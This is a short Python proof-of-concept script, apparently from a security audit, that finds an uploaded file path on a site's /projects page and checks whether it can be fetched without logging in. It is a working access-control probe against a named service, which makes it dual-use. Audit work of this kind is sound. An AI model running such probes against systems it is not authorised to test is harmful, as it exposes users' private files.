#!/usr/bin/env python3
"""Confirm that an uploaded asset remains reachable without authentication once its URL is known."""
import os
import re
import sys

import requests

BASE_URL = os.environ.get('MEGADEMO_BASE_URL', 'https://megademo.ai')
DEFAULT_COOKIE = 'connect.sid=YOUR_SESSION_COOKIE_HERE'
COOKIE = os.environ.get('MEGADEMO_COOKIE', DEFAULT_COOKIE)


def find_asset(html):
    match = re.search(r"(/uploads/[^\"']+)", html)
    return match.group(1) if match else None


def main():
    session = requests.Session()
    session.headers.update({'User-Agent': 'megademo-security-audit-poc/1.0', 'Cookie': COOKIE})
    browse = session.get(f'{BASE_URL}/projects', timeout=20)
    asset = os.environ.get('MEGADEMO_UPLOAD_PATH') or find_asset(browse.text)

    print(f'GET /projects -> {browse.status_code}')
    print(f'Asset path: {asset}')
    if browse.status_code != 200 or not asset:
        print('NOT CONFIRMED: no uploaded asset path was discovered.')
        return 1

    unauth = requests.get(
        f'{BASE_URL}{asset}',
        headers={'User-Agent': 'megademo-security-audit-poc/1.0'},
        allow_redirects=False,
        timeout=20,
    )
    print(f'GET {asset} without auth -> {unauth.status_code}')
    print(f'Content-Type: {unauth.headers.get("content-type")}')
    print(f'Body preview: {unauth.text[:120].replace(chr(10), " ")}')

    if unauth.status_code == 200:
        print()
        print('CONFIRMED: the uploaded asset was retrievable without authentication.')
        return 0

    print()
    print('NOT CONFIRMED: the unauthenticated asset fetch did not return 200.')
    return 1


if __name__ == '__main__':
    sys.exit(main())
